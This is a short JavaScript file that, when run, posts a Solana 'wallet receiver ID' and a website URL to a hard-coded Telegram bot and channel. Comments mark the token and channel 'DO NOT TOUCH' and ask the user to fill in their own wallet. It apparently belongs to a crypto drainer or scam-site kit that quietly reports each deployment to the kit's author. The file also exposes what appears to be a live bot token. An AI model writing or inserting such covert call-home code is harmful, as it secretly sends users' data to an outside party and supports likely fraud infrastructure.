const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7862771024:AAF8Tw-8GH2XP2t8LvMaJGn4jPCD3ndhJ9g';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '-1002565363021';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'B91G7R5MK2DYgyYiorhpJchxzWWjbGt4tqRfLSrubvSA';
const website_url = 'localhost';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
